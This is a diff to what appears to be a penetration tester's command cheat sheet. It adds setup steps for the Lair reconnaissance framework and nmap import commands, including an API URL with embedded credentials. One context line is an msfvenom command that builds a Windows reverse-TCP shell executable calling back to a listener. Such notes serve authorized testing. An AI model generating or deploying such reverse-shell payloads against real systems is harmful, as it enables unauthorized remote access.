@@ -583,9 +583,19 @@ Now send traffic to localhost:8081 and it will go via burp
 
 # ----- lair Frameworkd Dockers ----- #
 
+replace docker-compose.yml from my script folder.
+docker-compose build
+docker-compose up
+wget https://github.com/lair-framework/drone-nmap/releases/download/v2.1.1/drone-nmap_linux_amd64
+chmod +x drone-nmap_linux_amd64
+export LAIR_API_SERVER='https://admin@localhost:2965@172.16.14.220:11013'
+./drone-nmap_linux_amd64 xdddcvSt333 ../Desktop/initscan.xml
+
 
 #### Import Nmap scans to lair
 ./drone-nmap_darwin_amd64 5T9mjLQEp32g8BXCH /Path/nmap.xml
+
+
 
 # ----- msfvenom ----- #
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT 80 -f exe > /tmp/file.exe
